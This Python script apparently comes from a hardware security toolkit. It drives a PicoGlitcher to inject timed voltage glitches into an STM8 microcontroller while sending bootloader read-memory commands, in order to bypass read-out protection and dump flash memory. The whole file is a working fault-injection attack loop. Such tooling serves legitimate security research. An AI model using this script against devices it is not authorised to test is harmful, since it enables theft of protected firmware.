#!/usr/bin/env python3
# Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
# You may use, distribute and modify this code under the terms of the GPL3 license.
#
# You should have received a copy of the GPL3 license with this file.
# If not, please write to: m.kesenheimer@gmx.net.

# SQL Queries:
# Show only successes and flash-resets:
# color = 'R' or response LIKE '_Warning.flash_reset'

import argparse
import logging
import random
import sys
import time

# import custom libraries
from findus import Database, PicoGlitcher, STM8Programmer

class DerivedPicoGlitcher(PicoGlitcher):
    def classify(self, state:bytes) -> str:
        color = 'C'
        if b'error: sending read memory command failed' == state:
            color = 'G'
        elif b'error' in state:
            color = 'M'
        elif b'warning' in state:
            color = 'O'
        elif b'timeout' in state:
            color = 'Y'
        elif b'ok' in state:
            color = 'C'
        elif b'success' in state:
            color = 'R'
        return color

class Main:
    def __init__(self, args):
        self.args = args

        # logging
        logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)

        # glitcher
        self.glitcher = DerivedPicoGlitcher()
        # if argument args.power is not provided, the internal power-cycling capabilities of the pico-glitcher will be used. In this case, ext_power_voltage is not used.
        self.glitcher.init(port=args.rpico)

        # the initial voltage for multiplexing must be hard-coded and can only be applied
        # if the raspberry pi pico is reset and re-initialized.
        if args.multiplexing:
            self.glitcher.change_config_and_reset("mux_vinit", "1.8")
            self.glitcher.init(port=args.rpico)

        # we want to trigger on x11 with the configuration 8e1
        # since our statemachine understands only 8n1,
        # we can trigger on x22 with the configuration 9n1 instead
        # Update: Triggering on x11 in configuration 8n1 works good enough.
        self.glitcher.uart_trigger(0x11)

        # choose multiplexing, pulse-shaping or crowbar glitching
        if args.multiplexing:
            self.glitcher.set_multiplexing()
        else:
            self.glitcher.set_lpglitch()

        # set up the database
        self.database = Database(sys.argv, resume=self.args.resume, nostore=self.args.no_store)
        self.start_time = int(time.time())
        # if number of experiments get too large, remove the expected results
        #self.database.cleanup("G")

        # STM8Programmer ISP interface
        self.programmer = STM8Programmer(port=self.args.target, baud=115200)

    def run(self):
        # log execution
        logging.info(" ".join(sys.argv))

        s_delay = self.args.delay[0]
        e_delay = self.args.delay[1]
        s_length = self.args.length[0]
        e_length = self.args.length[1]

        experiment_id = 0
        while True:
            # flush garbage
            #self.programmer.flush()

            # set up glitch parameters (in nano seconds) and arm glitcher
            delay = random.randint(s_delay, e_delay)
            length = random.randint(s_length, e_length)

            # arm
            if args.multiplexing:
                mul_config = {"t1": length, "v1": "GND"}
                self.glitcher.arm_multiplexing(delay, mul_config)
            else:
                self.glitcher.arm(delay, length)

            # reset target (this triggers the glitch)
            self.glitcher.reset(0.01)
            #self.glitcher.power_cycle_reset()
            time.sleep(0.01)

            # setup bootloader communication
            state = self.programmer.bootloader_enter()
            mem = b''
            if b'success' in state:
                # send read memory command (this triggers the glitch)
                state, mem = self.programmer.read_memory(address=0x8000, length=0xff)

            # block until glitch
            try:
                self.glitcher.block(timeout=1)
            except Exception as _:
                print("[-] Timeout received in block(). Continuing.")
                self.glitcher.power_cycle_reset()
                time.sleep(0.2)
                state = b'timeout: trigger not observed'

            # classify state
            color = self.glitcher.classify(state)

            # add to database
            self.database.insert(experiment_id, delay, length, color, state + mem)

            # monitor
            speed = self.glitcher.get_speed(self.start_time, experiment_id)
            experiment_base_id = self.database.get_base_experiments_count()
            print(self.glitcher.colorize(f"[+] Experiment {experiment_id}\t{experiment_base_id}\t({speed})\t{delay}\t{length}\t{color}\t{state + mem}", color))

            # increase experiment id
            experiment_id += 1

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", required=False, help="target port", default="/dev/ttyUSB1")
    parser.add_argument("--rpico", required=False, help="rpico port", default="/dev/ttyUSB2")
    parser.add_argument("--delay", required=True, nargs=2, help="delay start and end", type=int)
    parser.add_argument("--length", required=True, nargs=2, help="length start and end", type=int)
    parser.add_argument("--resume", required=False, action='store_true', help="if an previous dataset should be resumed")
    parser.add_argument("--no-store", required=False, action='store_true', help="do not store the run in the database")
    parser.add_argument("--trigger-input", required=False, default="default", help="The trigger input to use (default, alt, ext1, ext2). The inputs ext1 and ext2 require the PicoGlitcher v2.")
    parser.add_argument("--multiplexing", required=False, action='store_true', help="Instead of crowbar glitching, perform a fault injection with multiplexing between different voltages (requires PicoGlitcher v2).")
    args = parser.parse_args()

    main = Main(args)

    try:
        main.run()
    except KeyboardInterrupt:
        print("\nExitting...")
        sys.exit(1)